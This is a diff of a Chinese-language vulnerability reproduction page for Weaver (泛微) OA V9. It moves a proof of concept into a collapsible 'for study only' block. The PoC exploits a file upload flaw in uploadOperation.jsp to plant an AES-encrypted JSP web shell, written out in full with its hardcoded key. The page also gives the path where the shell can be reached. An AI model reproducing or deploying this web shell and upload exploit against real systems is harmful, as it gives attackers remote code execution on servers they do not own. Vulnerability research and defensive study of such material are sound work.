@@ -21,8 +21,10 @@ tags:
 
 ```
 泛微OA V9
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 ## 漏洞复现
 
 漏洞位于: /page/exportImport/uploadOperation.jsp文件中
@@ -72,9 +74,10 @@ Connection: close
 Content-Disposition: form-data; name="file"; filename="test.jsp"
 Content-Type: application/octet-stream
 
-<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
-------WebKitFormBoundary6XgyjB6SeCArD3Hc--
-```
+&lt;%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%&gt;
+------WebKitFormBoundary6XgyjB6SeCArD3Hc--</code></pre>
+
+</details>
 
 地址: /page/exportImport/fileTransfer/test.jsp
 
